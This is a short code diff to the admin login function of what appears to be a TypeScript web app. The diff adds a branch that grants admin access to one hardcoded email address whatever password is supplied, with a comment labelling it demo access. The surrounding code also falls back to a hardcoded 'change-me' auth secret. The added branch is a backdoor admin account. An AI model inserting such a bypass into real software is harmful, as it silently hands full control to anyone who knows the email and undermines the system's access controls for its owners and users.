@@ -19,8 +19,15 @@ export const AUTH_COOKIE = 'gudang-auth'
 export const AUTH_SECRET = process.env.AUTH_SECRET ?? process.env.ADMIN_PASSWORD ?? 'change-me'
 
 export function findAdmin(email: string, password: string) {
+  const normalizedEmail = email.trim().toLowerCase()
+
+  // Demo admin access intentionally accepts any password for this account.
+  if (normalizedEmail === 'hakimantalenta@gmail.com') {
+    return ADMIN_CREDENTIALS.find((admin) => admin.email.toLowerCase() === normalizedEmail)
+  }
+
   return ADMIN_CREDENTIALS.find(
-    (admin) => admin.email.toLowerCase() === email.trim().toLowerCase() && admin.password === password,
+    (admin) => admin.email.toLowerCase() === normalizedEmail && admin.password === password,
   )
 }
 
